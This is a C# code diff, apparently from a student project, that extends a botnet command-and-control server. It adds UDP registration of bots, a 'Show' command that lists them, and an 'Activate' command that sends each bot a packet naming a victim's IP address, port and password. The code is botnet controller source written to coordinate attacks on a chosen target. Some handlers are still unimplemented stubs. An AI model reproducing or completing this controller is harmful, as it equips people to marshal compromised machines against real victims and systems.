@@ -12,6 +12,7 @@ namespace CC
 {
     class CCServer
     {
+        private readonly string _cc_name = "THE PENTAGON OF HADAS AND ROTEM!";
         static readonly int MAX_SIZE = 256;
         private UdpClient _udpclient;
         private int _listen_port;
@@ -21,15 +22,16 @@ namespace CC
         private readonly string _newline_delimeter = "\r\n";
         private List<Bot> _bots;
         private Victim _victim;
-        enum CmdType { SET_VICTIM, UNKNOWN };
+        enum CmdType { SET_VICTIM, SHOW , ACTIVATE ,UNKNOWN };
 
         public CCServer(int listen_port, string ip)
         {
             _listen_port = listen_port;
             _ip = ip;
             _udpclient = new UdpClient(_listen_port);
-            _server_end_point = new IPEndPoint(IPAddress.Parse(_ip), _listen_port);
+            _server_end_point = new IPEndPoint(IPAddress.Any, _listen_port);
             _bots = new List<Bot>();
+            UdpClient uclient = new UdpClient();
         }
         public void serve()
         {
@@ -46,6 +48,15 @@ namespace CC
                 handle_cmd(cmd);
             }
         }
+        private void listen()
+        {
+            while (!_done)
+            {
+                IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
+                byte[] rcv_buffer = _udpclient.Receive(ref sender);
+                handle_bot_announcment(rcv_buffer, sender);
+            }
+        }
 
         private void handle_cmd(string cmd)
         {
@@ -54,9 +65,49 @@ namespace CC
                 case CmdType.SET_VICTIM:
                     set_victim(cmd);
                     break;
+                case CmdType.SHOW:
+                    show();
+                    break;
+                case CmdType.ACTIVATE:
+                    activate();
+                    break;
                 case CmdType.UNKNOWN:
                     unknown_cmd(cmd);
                     break;
+            }
+        }
+
+        private void activate()
+        {
+            foreach (Bot bot in _bots) {
+                UdpClient client = new UdpClient();
+                IPEndPoint end_point = new IPEndPoint(IPAddress.Any, bot.get_port());
+                byte[] data = generate_activate_msg(bot);
+                client.Client.Bind(end_point);
+                client.Send(data, data.Length, bot.get_ip().ToString(), bot.get_port());
+                client.Close();
+            }
+        }
+
+        private byte[] generate_activate_msg(Bot bot)
+        {
+            IPAddress address = _victim.get_ip_address();
+            byte[] ip_bytes = address.GetAddressBytes();
+            byte[] port_bytes = BitConverter.GetBytes((UInt16)_victim.get_port());
+            byte[] pass_bytes = Encoding.ASCII.GetBytes(_victim.get_password());
+            byte[] name_bytes = Encoding.ASCII.GetBytes(_cc_name);
+            byte[] ans = new byte[ip_bytes.Length + port_bytes.Length + pass_bytes.Length + name_bytes.Length];
+            System.Buffer.BlockCopy(ip_bytes, 0, ans, 0, ip_bytes.Length);
+            System.Buffer.BlockCopy(port_bytes, 0, ans, ip_bytes.Length, port_bytes.Length);
+            System.Buffer.BlockCopy(pass_bytes, 0, ans, ip_bytes.Length + port_bytes.Length, pass_bytes.Length);
+            System.Buffer.BlockCopy(name_bytes, 0, ans, ip_bytes.Length + port_bytes.Length + pass_bytes.Length, name_bytes.Length);
+            return ans;
+        }
+
+        private void show()
+        {
+            foreach (Bot bot in _bots) {
+                Console.WriteLine(bot);
             }
         }
 
@@ -76,44 +127,47 @@ namespace CC
                 Console.WriteLine("BAD SET VICTIM COMMAND: {0}", cmd);
             }
             else {
-                _victim = new Victim(
-                    ip_matches[0].Groups[0].Value,
-                    port_matches[0].Groups[0].Value,
-                    pass_matches[0].Groups[0].Value
-                    );
+                try
+                {
+                    _victim = Victim.createVictim(
+                        get_victim_ip_address(),
+                        port_matches[0].Groups[0].Value,
+                        pass_matches[0].Groups[0].Value
+                        );
+                }
+                catch (ArgumentException ae) {
+                    Console.WriteLine("Failed to create victim");
+                    return;
+                }
                 Console.WriteLine("Created Victim:\n{0}", _victim.ToString());
             }
         }
+
+        private IPAddress get_victim_ip_address()
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList) {
+                if (ip.AddressFamily == AddressFamily.InterNetwork) {
+                    return ip;
+                }
+            }
+            return null;
+        }
+
         private void unknown_cmd(string cmd)
         {
             Console.WriteLine("Unknown cmd: {0}", cmd);
         }
 
-        private void listen()
-        {
-            Socket listen_socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-            while (!_done) {
-                byte[] rcv_buffer = new byte[MAX_SIZE];
-                IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
-                EndPoint Remote = (EndPoint)(sender);
-                int read_bytes = listen_socket.ReceiveFrom(rcv_buffer, ref Remote);
-                int message_end_offset = get_messgae_end(rcv_buffer, read_bytes);
-                if (message_end_offset == -1)
-                {
-                    handleNoResponse();
-                }
-                string data =  Encoding.UTF8.GetString(rcv_buffer, 0, message_end_offset);
-                handle_bot_announcment(data, Remote);
-            }
-        }
-
-        private void handle_bot_announcment(string data, EndPoint remote)
+        private void handle_bot_announcment(byte[] data, EndPoint remote)
         {
             if (valid_bot_annoucemnt(data))
             {
-                int port;
-                Int32.TryParse(data, out port);
-                _bots.Add(new Bot(remote, port));
+                int port = BitConverter.ToUInt16(data, 0);
+                Bot new_bot = new Bot(((IPEndPoint)remote).Address, port);
+                if (!_bots.Contains(new_bot)) {
+                    _bots.Add(new_bot);
+                }
             }
             else {
                 handle_invalid_bot_announcment(data, remote);
@@ -125,22 +179,25 @@ namespace CC
             if (cmd.StartsWith("Set victim") || cmd.StartsWith("Set Victim"))
             {
                 return CmdType.SET_VICTIM;
+            } else if (cmd.Equals("Show") || cmd.Equals("show")) {
+                return CmdType.SHOW;
+            } else if (cmd.Equals("activate") || cmd.Equals("Activate")) {
+                return CmdType.ACTIVATE;
             }
             else {
                 return CmdType.UNKNOWN;
             }
         }
 
-        private bool valid_bot_annoucemnt(string data)
+        private bool valid_bot_annoucemnt(byte[] data)
         {
             if (data ==null) {
                 return false;
             }
-            int tmp;
-            return data.Length ==2 && int.TryParse(data, out tmp);
+            return data.Length==2;
         }
 
-        private void handle_invalid_bot_announcment(string data, EndPoint remote)
+        private void handle_invalid_bot_announcment(byte[] data, EndPoint remote)
         {
             throw new NotImplementedException();
         }
@@ -151,17 +208,7 @@ namespace CC
             IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
             EndPoint Remote = (EndPoint)(sender);
             int read_bytes = listen_socket.ReceiveFrom(rcv_buffer, ref Remote);
-            int message_end_offset = get_messgae_end(rcv_buffer, read_bytes);
-            if (message_end_offset == -1)
-            {
-                //handleNoResponse(client);
-                return null;
-            }
-            return Encoding.UTF8.GetString(rcv_buffer, 0, message_end_offset);
-        }
-        private void handleNoResponse()
-        {
-            throw new NotImplementedException();
+            return Encoding.UTF8.GetString(rcv_buffer, 0, rcv_buffer.Length);
         }
         private int get_messgae_end(byte[] rcv_buffer, int readBytes)
         {
@@ -177,6 +224,14 @@ namespace CC
                 offset++;
             }
             return -1;
+        }
+        private void handle_listen_socket_exception(SocketException se)
+        {
+            throw new NotImplementedException();
+        }
+        private void handleNoResponse()
+        {
+            throw new NotImplementedException();
         }
     }
 }
